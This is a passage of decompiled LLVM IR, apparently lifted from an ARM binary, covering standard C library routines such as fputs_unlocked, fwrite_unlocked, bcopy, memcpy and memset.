  %v2_14d08 = load i8, i8* %v1_14d08, align 1
  %v5_14d08 = add i32 %v3_14cf8, 1
  store i32 %v5_14d08, i32* %r2.global-to-local, align 4
  %v2_14d0c = load i32, i32* @r4, align 4
  %v3_14d0c = inttoptr i32 %v2_14d0c to i8*
  store i8 %v2_14d08, i8* %v3_14d0c, align 1
  %v0_14d10 = load i32, i32* @r4, align 4
  %v1_14d10 = inttoptr i32 %v0_14d10 to i8*
  %v2_14d10 = load i8, i8* %v1_14d10, align 1
  %v5_14d10 = add i32 %v0_14d10, 1
  store i32 %v5_14d10, i32* @r4, align 4
  %v2_14d14 = icmp ugt i8 %v2_14d10, 9
  store i1 %v2_14d14, i1* %cpsr_c.global-to-local, align 1
  %v7_14d14 = icmp eq i8 %v2_14d10, 10
  store i1 %v7_14d14, i1* %cpsr_z.global-to-local, align 1
  %v0_14d18 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d18 = load i32, i32* @r5, align 4
  %v2_14d18 = add i32 %v1_14d18, 16
  %v3_14d18 = inttoptr i32 %v2_14d18 to i32*
  store i32 %v0_14d18, i32* %v3_14d18, align 4
  br i1 %v7_14d14, label %dec_label_pc_14d58, label %dec_label_pc_14d4c.backedge

dec_label_pc_14d20:                               ; preds = %dec_label_pc_14cf8
  %v1_14d5024 = inttoptr i32 %v1_14d5024.in to i8*
  %v3_14d20 = call i32 @getc_unlocked(i8* %v1_14d5024)
  %v4_14d20 = trunc i32 %v3_14d20 to i8
  %v5_14d24 = icmp eq i8 %v4_14d20, -1
  store i1 %v5_14d24, i1* %cpsr_c.global-to-local, align 1
  %v10_14d24 = icmp eq i32 %v3_14d20, -1
  store i1 %v10_14d24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_14d24, label %dec_label_pc_14d2c, label %dec_label_pc_14d48

dec_label_pc_14d2c:                               ; preds = %dec_label_pc_14d20
  %v0_14d2c = load i32, i32* @r5, align 4
  %v1_14d2c = inttoptr i32 %v0_14d2c to i8*
  %v2_14d2c = load i8, i8* %v1_14d2c, align 1
  %v1_14d30 = and i8 %v2_14d2c, 8
  %v2_14d30 = icmp eq i8 %v1_14d30, 0
  store i1 %v2_14d30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14d30, label %dec_label_pc_14d58, label %dec_label_pc_14d68

dec_label_pc_14d48:                               ; preds = %dec_label_pc_14d20
  %v3_14d3c = load i32, i32* @r4, align 4
  %v4_14d3c = inttoptr i32 %v3_14d3c to i8*
  store i8 %v4_14d20, i8* %v4_14d3c, align 1
  %v0_14d40 = load i32, i32* @r4, align 4
  %v1_14d40 = inttoptr i32 %v0_14d40 to i8*
  %v2_14d40 = load i8, i8* %v1_14d40, align 1
  %v5_14d40 = add i32 %v0_14d40, 1
  store i32 %v5_14d40, i32* @r4, align 4
  %v2_14d44 = icmp ugt i8 %v2_14d40, 9
  store i1 %v2_14d44, i1* %cpsr_c.global-to-local, align 1
  %v7_14d44 = icmp eq i8 %v2_14d40, 10
  store i1 %v7_14d44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14d44, label %dec_label_pc_14d58, label %dec_label_pc_14d4c.backedge

dec_label_pc_14d4c.backedge:                      ; preds = %dec_label_pc_14d48, %dec_label_pc_14d08
  %v0_14d4c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_14d50.pre = load i32, i32* @r5, align 4
  %v1_14d4c = add i32 %v0_14d4c.pre, -1
  store i32 %v1_14d4c, i32* %r6.global-to-local, align 4
  %v2_14d4c = icmp ne i32 %v0_14d4c.pre, 0
  store i1 %v2_14d4c, i1* %cpsr_c.global-to-local, align 1
  %v7_14d4c = icmp eq i32 %v0_14d4c.pre, 1
  store i1 %v7_14d4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14d4c, label %dec_label_pc_14d58, label %dec_label_pc_14cf8

dec_label_pc_14d58:                               ; preds = %dec_label_pc_14d4c.preheader, %dec_label_pc_14d48, %dec_label_pc_14d4c.backedge, %dec_label_pc_14d08, %dec_label_pc_14d2c
  %v0_14d58 = load i32, i32* @r4, align 4
  %v1_14d58 = load i32, i32* %r7.global-to-local, align 4
  %v3_14d58 = icmp uge i32 %v0_14d58, %v1_14d58
  store i1 %v3_14d58, i1* %cpsr_c.global-to-local, align 1
  %v9_14d58 = icmp eq i32 %v0_14d58, %v1_14d58
  store i1 %v9_14d58, i1* %cpsr_z.global-to-local, align 1
  %v2_14d5c = xor i1 %v9_14d58, true
  %v3_14d5c = and i1 %v3_14d58, %v2_14d5c
  br i1 %v3_14d5c, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_14d58
  %v7_14d60 = inttoptr i32 %v0_14d58 to i8*
  store i8 0, i8* %v7_14d60, align 1
  %v0_14d64.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_14d64.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_14d58, %bb
  %v1_14d64 = phi i1 [ %v1_14d64.pre, %bb ], [ %v9_14d58, %dec_label_pc_14d58 ]
  %v0_14d64 = phi i1 [ %v0_14d64.pre, %bb ], [ %v3_14d58, %dec_label_pc_14d58 ]
  %v2_14d64 = xor i1 %v1_14d64, true
  %v3_14d64 = and i1 %v0_14d64, %v2_14d64
  br i1 %v3_14d64, label %.dec_label_pc_14d6c_crit_edge, label %dec_label_pc_14d68

.dec_label_pc_14d6c_crit_edge:                    ; preds = %.thread7
  %v0_14d6c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14d6c

dec_label_pc_14d68:                               ; preds = %entry, %dec_label_pc_14d2c, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14d6c

dec_label_pc_14d6c:                               ; preds = %.dec_label_pc_14d6c_crit_edge, %dec_label_pc_14d68
  %v0_14d6c = phi i32 [ %v0_14d6c.pre, %.dec_label_pc_14d6c_crit_edge ], [ 0, %dec_label_pc_14d68 ]
  ret i32 %v0_14d6c

; uselistorder directives
  uselistorder i1 %v9_14d58, { 1, 0, 2 }
  uselistorder i32 %v1_14d58, { 1, 0 }
  uselistorder i32 %v0_14d58, { 0, 2, 1 }
  uselistorder i32 %v0_14d4c.pre, { 2, 0, 1 }
  uselistorder i1 %v2_14d30, { 1, 0 }
  uselistorder i32 %v3_14cf8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_14d5024.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 9, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_14d6c, { 1, 0 }
  uselistorder label %dec_label_pc_14d68, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_14d58, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_14cf8, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_14d74 = load i32, i32* @r4, align 4
  store i32 %v3_14d74, i32* %stack_var_-16, align 4
  %v6_14d74 = load i32, i32* @r5, align 4
  %v9_14d74 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_14d80 = call i32 @strlen(i8* %arg1)
  store i32 %v3_14d80, i32* @r6, align 4
  %v0_14d88 = load i32, i32* @r5, align 4
  %v0_14d8c = load i32, i32* @r4, align 4
  %v5_14d98 = inttoptr i32 %v0_14d88 to i8*
  %v6_14d98 = call i32 @__GI_fwrite_unlocked(i32 %v0_14d8c, i32 1, i32 %v3_14d80, i8* %v5_14d98)
  %v1_14d9c = load i32, i32* @r6, align 4
  %v9_14d9c = icmp eq i32 %v6_14d98, %v1_14d9c
  br i1 %v9_14d9c, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_14da4 = phi i32 [ %v6_14d98, %entry ], [ -1, %bb ]
  %v2_14da4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14da4, i32* @r4, align 4
  store i32 %v6_14d74, i32* @r5, align 4
  store i32 %v9_14d74, i32* @r6, align 4
  ret i32 %v14_14da4

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_14da8 = load i32, i32* @r6, align 4
  %v12_14da8 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_14db0 = load i8, i8* %arg4, align 1
  %v4_14db0 = zext i8 %v3_14db0 to i32
  %v1_14db4 = and i32 %v4_14db0, 192
  store i32 %v1_14db4, i32* %r3.global-to-local, align 4
  %v2_14db8 = icmp eq i32 %v1_14db4, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_14db8, label %dec_label_pc_14de0, label %dec_label_pc_14dd4

dec_label_pc_14dd4:                               ; preds = %entry
  %v4_14dd4 = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_14dd8 = icmp eq i32 %v4_14dd4, 0
  br i1 %v2_14dd8, label %dec_label_pc_14dd4.dec_label_pc_14de0_crit_edge, label %dec_label_pc_14e48

dec_label_pc_14dd4.dec_label_pc_14de0_crit_edge:  ; preds = %dec_label_pc_14dd4
  %v0_14de0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14de0

dec_label_pc_14de0:                               ; preds = %dec_label_pc_14dd4.dec_label_pc_14de0_crit_edge, %entry
  %v0_14de81 = phi i32 [ %v0_14de0.pre, %dec_label_pc_14dd4.dec_label_pc_14de0_crit_edge ], [ %arg2, %entry ]
  %v2_14de0 = icmp eq i32 %v0_14de81, 0
  br i1 %v2_14de0, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_14de0
  br label %dec_label_pc_14e48

bb:                                               ; preds = %dec_label_pc_14de0
  %v1_14de4 = load i32, i32* @r6, align 4
  %v3_14de4 = icmp eq i32 %v1_14de4, 0
  br i1 %v3_14de4, label %dec_label_pc_14e48, label %dec_label_pc_14df4

dec_label_pc_14df4:                               ; preds = %bb
  %v2_14df4 = udiv i32 -1, %v0_14de81
  %v0_14dfc = load i32, i32* @r4, align 4
  store i32 %v0_14dfc, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_14de4, %v2_14df4
  br i1 %tmp10, label %dec_label_pc_14e20, label %dec_label_pc_14e08

dec_label_pc_14e08:                               ; preds = %dec_label_pc_14df4
  %v0_14e00 = load i32, i32* @r7, align 4
  %v2_14e08 = mul i32 %v1_14de4, %v0_14de81
  %v4_14e0c = call i32 @__stdio_fwrite(i32 %v0_14e00, i32 %v2_14e08, i32 %v0_14dfc)
  %v0_14e10 = load i32, i32* @r5, align 4
  %v2_14e14 = udiv i32 %v4_14e0c, %v0_14e10
  store i32 %v2_14e14, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14e4c

dec_label_pc_14e20:                               ; preds = %dec_label_pc_14df4
  %v1_14e20 = inttoptr i32 %v0_14dfc to i32*
  %v2_14e20 = load i32, i32* %v1_14e20, align 4
  %v1_14e24 = or i32 %v2_14e20, 8
  store i32 %v1_14e24, i32* %r3.global-to-local, align 4
  %v3_14e28 = sdiv i32 %v2_14e20, 256
  store i32 %v3_14e28, i32* %r2.global-to-local, align 4
  %v1_14e2c = trunc i32 %v3_14e28 to i8
  %v3_14e2c = add i32 %v0_14dfc, 1
  %v4_14e2c = inttoptr i32 %v3_14e2c to i8*
  store i8 %v1_14e2c, i8* %v4_14e2c, align 1
  %v0_14e30 = load i32, i32* %r3.global-to-local, align 4
  %v1_14e30 = trunc i32 %v0_14e30 to i8
  %v2_14e30 = load i32, i32* @r4, align 4
  %v3_14e30 = inttoptr i32 %v2_14e30 to i8*
  store i8 %v1_14e30, i8* %v3_14e30, align 1
  %v0_14e34 = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_14e40 = inttoptr i32 %v0_14e34 to i32*
  store i32 22, i32* %v2_14e40, align 4
  %v0_14e4c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14e4c

dec_label_pc_14e48:                               ; preds = %.thread, %dec_label_pc_14dd4, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14e4c

dec_label_pc_14e4c:                               ; preds = %dec_label_pc_14e20, %dec_label_pc_14e08, %dec_label_pc_14e48
  %v0_14e4c = phi i32 [ %v0_14e4c.pre, %dec_label_pc_14e20 ], [ %v2_14e14, %dec_label_pc_14e08 ], [ 0, %dec_label_pc_14e48 ]
  store i32 %v9_14da8, i32* @r6, align 4
  store i32 %v12_14da8, i32* @r7, align 4
  ret i32 %v0_14e4c

; uselistorder directives
  uselistorder i32 %v3_14e28, { 1, 0 }
  uselistorder i32 %v1_14de4, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_14e4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14e48, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_14e6c = inttoptr i32 %arg2 to i8*
  %v3_14e6c = call i32 @_memcpy(i8* %v2_14e6c, i32 %arg1)
  ret i32 %v3_14e6c
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_14e70 = load i32, i32* @r0, align 4
  %v1_14e70 = load i32, i32* @r1, align 4
  %v2_14e70 = inttoptr i32 %v0_14e70 to i8*
  %v3_14e70 = call i32 @_memcpy(i8* %v2_14e70, i32 %v1_14e70)
  ret i32 %v3_14e70
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_14e84 = load i32, i32* @r2, align 4
  %v8_14e84 = icmp eq i32 %v0_14e84, 8
  store i1 %v8_14e84, i1* %cpsr_z.global-to-local, align 1
  %v5_14e88 = icmp slt i32 %v0_14e84, 8
  br i1 %v5_14e88, label %dec_label_pc_14ee8, label %dec_label_pc_14e8c

dec_label_pc_14e8c:                               ; preds = %entry
  %v4_14e8c = mul i32 %arg2, 256
  %v5_14e8c = or i32 %v4_14e8c, %arg2
  %v4_14e90 = mul i32 %v5_14e8c, 65536
  %v5_14e90 = or i32 %v4_14e90, %v5_14e8c
  store i32 %v5_14e90, i32* %r1.global-to-local, align 4
  %v1_14e9457 = urem i32 %tmp, 4
  %v2_14e9458 = icmp eq i32 %v1_14e9457, 0
  store i1 %v2_14e9458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_14e9458, label %dec_label_pc_14ea4, label %bb

bb:                                               ; preds = %dec_label_pc_14e8c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_14e8c ]
  %v3_14e9859 = phi i32 [ %v6_14e98, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_14e8c ]
  %v4_14e98 = inttoptr i32 %v3_14e9859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_14e98, align 1
  %v5_14e98 = load i32, i32* %r3.global-to-local, align 4
  %v6_14e98 = add i32 %v5_14e98, 1
  store i32 %v6_14e98, i32* %r3.global-to-local, align 4
  %v0_14e9c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_14ea8.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_14e9c.pr, label %dec_label_pc_14ea4, label %.thread

.thread:                                          ; preds = %bb
  %v2_14e9c = add i32 %v0_14ea8.pr.pre, -1
  store i32 %v2_14e9c, i32* @r2, align 4
  %v1_14e94 = urem i32 %v6_14e98, 4
  %v2_14e94 = icmp eq i32 %v1_14e94, 0
  store i1 %v2_14e94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14e94, label %dec_label_pc_14ea4, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_14e98.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_14e98.pre to i8
  br label %bb

dec_label_pc_14ea4:                               ; preds = %.thread, %bb, %dec_label_pc_14e8c
  %v0_14eb028 = phi i32 [ %tmp, %dec_label_pc_14e8c ], [ %v6_14e98, %bb ], [ %v6_14e98, %.thread ]
  %v0_14ea8.pr = phi i32 [ %v0_14e84, %dec_label_pc_14e8c ], [ %v0_14ea8.pr.pre, %bb ], [ %v2_14e9c, %.thread ]
  %v0_14ea4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_14ea4, i32* @ip, align 4
  %v8_14ea810 = icmp eq i32 %v0_14ea8.pr, 8
  store i1 %v8_14ea810, i1* %cpsr_z.global-to-local, align 1
  %v5_14eac11 = icmp slt i32 %v0_14ea8.pr, 8
  br i1 %v5_14eac11, label %dec_label_pc_14ee8, label %dec_label_pc_14eb0.preheader

dec_label_pc_14eb0.preheader:                     ; preds = %dec_label_pc_14ea4
  %v1_14eb046 = inttoptr i32 %v0_14eb028 to i32*
  store i32 %v0_14ea4, i32* %v1_14eb046, align 4
  %v3_14eb047 = add i32 %v0_14eb028, 4
  %v4_14eb048 = inttoptr i32 %v3_14eb047 to i32*
  %v5_14eb049 = load i32, i32* @ip, align 4
  store i32 %v5_14eb049, i32* %v4_14eb048, align 4
  %v6_14eb050 = add i32 %v0_14eb028, 8
  store i32 %v6_14eb050, i32* %r3.global-to-local, align 4
  %v0_14eb451 = load i32, i32* @r2, align 4
  %v1_14eb452 = add i32 %v0_14eb451, -8
  store i32 %v1_14eb452, i32* %r2.global-to-local, align 4
  %v5_14ebc53 = icmp slt i32 %v1_14eb452, 8
  br i1 %v5_14ebc53, label %dec_label_pc_14eb0.dec_label_pc_14ee8.loopexit_crit_edge, label %dec_label_pc_14ec0

dec_label_pc_14ec0:                               ; preds = %dec_label_pc_14eb0.preheader, %dec_label_pc_14ea8.dec_label_pc_14eb0_crit_edge
  %v6_14eb055 = phi i32 [ %v6_14eb0, %dec_label_pc_14ea8.dec_label_pc_14eb0_crit_edge ], [ %v6_14eb050, %dec_label_pc_14eb0.preheader ]
  %v0_14eb054 = phi i32 [ %v12_14edc, %dec_label_pc_14ea8.dec_label_pc_14eb0_crit_edge ], [ %v0_14eb028, %dec_label_pc_14eb0.preheader ]
  %v1_14ec0 = inttoptr i32 %v6_14eb055 to i32*
  %v2_14ec0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_14ec0, i32* %v1_14ec0, align 4
  %v3_14ec0 = add i32 %v0_14eb054, 12
  %v4_14ec0 = inttoptr i32 %v3_14ec0 to i32*
  %v5_14ec0 = load i32, i32* @ip, align 4
  store i32 %v5_14ec0, i32* %v4_14ec0, align 4
  %v6_14ec0 = add i32 %v0_14eb054, 16
  store i32 %v6_14ec0, i32* %r3.global-to-local, align 4
  %v0_14ec4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ec4 = add i32 %v0_14ec4, -8
  store i32 %v1_14ec4, i32* %r2.global-to-local, align 4
  %v5_14ecc = icmp slt i32 %v1_14ec4, 8
  br i1 %v5_14ecc, label %dec_label_pc_14ec0.dec_label_pc_14ee8.loopexit_crit_edge, label %dec_label_pc_14ed0

dec_label_pc_14ed0:                               ; preds = %dec_label_pc_14ec0
  %v1_14ed0 = inttoptr i32 %v6_14ec0 to i32*
  %v2_14ed0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_14ed0, i32* %v1_14ed0, align 4
  %v3_14ed0 = add i32 %v0_14eb054, 20
  %v4_14ed0 = inttoptr i32 %v3_14ed0 to i32*
  %v5_14ed0 = load i32, i32* @ip, align 4
  store i32 %v5_14ed0, i32* %v4_14ed0, align 4
  %v6_14ed0 = add i32 %v0_14eb054, 24
  store i32 %v6_14ed0, i32* %r3.global-to-local, align 4
  %v0_14ed4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14ed4 = add i32 %v0_14ed4, -8
  store i32 %v1_14ed4, i32* %r2.global-to-local, align 4
  %v5_14edc = icmp slt i32 %v1_14ed4, 8
  br i1 %v5_14edc, label %dec_label_pc_14ed0.dec_label_pc_14ee8.loopexit_crit_edge, label %dec_label_pc_14ea8

dec_label_pc_14ea8:                               ; preds = %dec_label_pc_14ed0
  %v7_14edc = inttoptr i32 %v6_14ed0 to i32*
  %v8_14edc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_14edc, i32* %v7_14edc, align 4
  %v9_14edc = add i32 %v0_14eb054, 28
  %v10_14edc = inttoptr i32 %v9_14edc to i32*
  %v11_14edc = load i32, i32* @ip, align 4
  store i32 %v11_14edc, i32* %v10_14edc, align 4
  %v12_14edc = add i32 %v0_14eb054, 32
  store i32 %v12_14edc, i32* %r3.global-to-local, align 4
  %v6_14ee0 = load i32, i32* %r2.global-to-local, align 4
  %v7_14ee0 = add i32 %v6_14ee0, -8
  store i32 %v7_14ee0, i32* %r2.global-to-local, align 4
  %v5_14eac = icmp slt i32 %v7_14ee0, 8
  br i1 %v5_14eac, label %dec_label_pc_14ea8.dec_label_pc_14ee8.loopexit_crit_edge, label %dec_label_pc_14ea8.dec_label_pc_14eb0_crit_edge

dec_label_pc_14ea8.dec_label_pc_14eb0_crit_edge:  ; preds = %dec_label_pc_14ea8
  %v2_14eb0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_14eb0 = inttoptr i32 %v12_14edc to i32*
  store i32 %v2_14eb0.pre, i32* %v1_14eb0, align 4
  %v3_14eb0 = add i32 %v0_14eb054, 36
  %v4_14eb0 = inttoptr i32 %v3_14eb0 to i32*
  %v5_14eb0 = load i32, i32* @ip, align 4
  store i32 %v5_14eb0, i32* %v4_14eb0, align 4
  %v6_14eb0 = add i32 %v0_14eb054, 40
  store i32 %v6_14eb0, i32* %r3.global-to-local, align 4
  %v0_14eb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_14eb4 = add i32 %v0_14eb4, -8
  store i32 %v1_14eb4, i32* %r2.global-to-local, align 4
  %v5_14ebc = icmp slt i32 %v1_14eb4, 8
  br i1 %v5_14ebc, label %dec_label_pc_14eb0.dec_label_pc_14ee8.loopexit_crit_edge, label %dec_label_pc_14ec0

dec_label_pc_14eb0.dec_label_pc_14ee8.loopexit_crit_edge: ; preds = %dec_label_pc_14ea8.dec_label_pc_14eb0_crit_edge, %dec_label_pc_14eb0.preheader
  %v1_14eb4.lcssa = phi i32 [ %v1_14eb452, %dec_label_pc_14eb0.preheader ], [ %v1_14eb4, %dec_label_pc_14ea8.dec_label_pc_14eb0_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14ee8

dec_label_pc_14ea8.dec_label_pc_14ee8.loopexit_crit_edge: ; preds = %dec_label_pc_14ea8
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14ee8

dec_label_pc_14ec0.dec_label_pc_14ee8.loopexit_crit_edge: ; preds = %dec_label_pc_14ec0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14ee8

dec_label_pc_14ed0.dec_label_pc_14ee8.loopexit_crit_edge: ; preds = %dec_label_pc_14ed0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14ee8

dec_label_pc_14ee8:                               ; preds = %dec_label_pc_14ea4, %dec_label_pc_14eb0.dec_label_pc_14ee8.loopexit_crit_edge, %dec_label_pc_14ea8.dec_label_pc_14ee8.loopexit_crit_edge, %dec_label_pc_14ec0.dec_label_pc_14ee8.loopexit_crit_edge, %dec_label_pc_14ed0.dec_label_pc_14ee8.loopexit_crit_edge, %entry
  %v0_14ef0 = phi i32 [ %v0_14e84, %entry ], [ %v1_14ed4, %dec_label_pc_14ed0.dec_label_pc_14ee8.loopexit_crit_edge ], [ %v1_14ec4, %dec_label_pc_14ec0.dec_label_pc_14ee8.loopexit_crit_edge ], [ %v7_14ee0, %dec_label_pc_14ea8.dec_label_pc_14ee8.loopexit_crit_edge ], [ %v1_14eb4.lcssa, %dec_label_pc_14eb0.dec_label_pc_14ee8.loopexit_crit_edge ], [ %v0_14ea8.pr, %dec_label_pc_14ea4 ]
  %v2_14ee8 = icmp eq i32 %v0_14ef0, 0
  store i1 %v2_14ee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ee8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_14ee8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_14ee8
  %v1_14ef0 = sub i32 7, %v0_14ef0
  store i32 %v1_14ef0, i32* %r2.global-to-local, align 4
  %v3_14ef4 = mul i32 %v1_14ef0, 4
  %v4_14ef4 = add i32 %v3_14ef4, ptrtoint (i32* @global_var_14efc.949 to i32)
  call void @__pseudo_branch(i32 %v4_14ef4)
  %v0_14efc = load i32, i32* %r1.global-to-local, align 4
  %v1_14efc = trunc i32 %v0_14efc to i8
  %v2_14efc = load i32, i32* %r3.global-to-local, align 4
  %v3_14efc = inttoptr i32 %v2_14efc to i8*
  store i8 %v1_14efc, i8* %v3_14efc, align 1
  %v4_14efc = load i32, i32* %r3.global-to-local, align 4
  %v5_14efc = add i32 %v4_14efc, 1
  store i32 %v5_14efc, i32* %r3.global-to-local, align 4
  %v0_14f00 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f00 = trunc i32 %v0_14f00 to i8
  %v3_14f00 = inttoptr i32 %v5_14efc to i8*
  store i8 %v1_14f00, i8* %v3_14f00, align 1
  %v4_14f00 = load i32, i32* %r3.global-to-local, align 4
  %v5_14f00 = add i32 %v4_14f00, 1
  store i32 %v5_14f00, i32* %r3.global-to-local, align 4
  %v0_14f04 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f04 = trunc i32 %v0_14f04 to i8
  %v3_14f04 = inttoptr i32 %v5_14f00 to i8*
  store i8 %v1_14f04, i8* %v3_14f04, align 1
  %v4_14f04 = load i32, i32* %r3.global-to-local, align 4
  %v5_14f04 = add i32 %v4_14f04, 1
  store i32 %v5_14f04, i32* %r3.global-to-local, align 4
  %v0_14f08 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f08 = trunc i32 %v0_14f08 to i8
  %v3_14f08 = inttoptr i32 %v5_14f04 to i8*
  store i8 %v1_14f08, i8* %v3_14f08, align 1
  %v4_14f08 = load i32, i32* %r3.global-to-local, align 4
  %v5_14f08 = add i32 %v4_14f08, 1
  store i32 %v5_14f08, i32* %r3.global-to-local, align 4
  %v0_14f0c = load i32, i32* %r1.global-to-local, align 4
  %v1_14f0c = trunc i32 %v0_14f0c to i8
  %v3_14f0c = inttoptr i32 %v5_14f08 to i8*
  store i8 %v1_14f0c, i8* %v3_14f0c, align 1
  %v4_14f0c = load i32, i32* %r3.global-to-local, align 4
  %v5_14f0c = add i32 %v4_14f0c, 1
  store i32 %v5_14f0c, i32* %r3.global-to-local, align 4
  %v0_14f10 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f10 = trunc i32 %v0_14f10 to i8
  %v3_14f10 = inttoptr i32 %v5_14f0c to i8*
  store i8 %v1_14f10, i8* %v3_14f10, align 1
  %v4_14f10 = load i32, i32* %r3.global-to-local, align 4
  %v5_14f10 = add i32 %v4_14f10, 1
  store i32 %v5_14f10, i32* %r3.global-to-local, align 4
  %v0_14f14 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f14 = trunc i32 %v0_14f14 to i8
  %v3_14f14 = inttoptr i32 %v5_14f10 to i8*
  store i8 %v1_14f14, i8* %v3_14f14, align 1
  %v4_14f14 = load i32, i32* %r3.global-to-local, align 4
  %v5_14f14 = add i32 %v4_14f14, 1
  store i32 %v5_14f14, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_14eb0, { 1, 0 }
  uselistorder i32 %v12_14edc, { 1, 2, 0 }
  uselistorder i32 %v0_14eb054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_14ea8.pr, { 0, 2, 1 }
  uselistorder i32 %v6_14e98, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_14e8c, { 1, 0 }
  uselistorder i32 %v0_14e84, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
